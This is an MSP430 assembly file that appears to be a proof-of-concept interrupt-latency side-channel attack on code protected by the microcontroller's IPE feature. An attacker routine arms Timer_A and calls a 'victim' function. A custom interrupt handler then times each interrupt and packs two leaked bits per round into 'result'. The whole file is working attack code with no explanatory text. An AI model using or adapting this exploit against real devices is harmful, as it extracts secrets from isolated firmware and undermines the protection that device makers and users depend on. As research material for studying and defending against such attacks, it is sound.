	.global victim
	.global TA0CTL
	.global TA0CCR0
	.global TA0R
	.global pcs
	.global attacker
	.global latencies
	.global result

	.sect ".att_ram_code"

count:
	.word 0x0
latencies:
	.field 0,64
pcs:
	.field 0,64
result:
	.word 0

attacker:
	cmp #8, &count
	jz end
	mov #11b, r12
	nop
	eint
	nop
    mov #0x4, &TA0CTL
    mov #0x14, &TA0CCR0
    mov #0x216, &TA0CTL

	call #victim
end:
	reta

isr_ipe:
    mov #0x0, &TA0CTL
	mov &count, r15
	add r15, r15
	inc &count
	mov &TA0R, r8
	sub #9, r8
	dec r8
	cmp #0, r8
	jz zero
	dec r8
zero:
	bit #1, r8
	rrc &result
	bit #2, r8
	rrc &result
	;mov &TA0R, latencies(r15)
	;sub #9, latencies(r15)
	;add #2, sp
	;mov @sp, pcs(r15)
	;add #4, sp ; 2 for pc, 2 for return address from victim
	add #6, sp
	nop
	eint
	nop
	jmp attacker
	nop


	.sect ".int44"
iv_45:
	.word isr_ipe
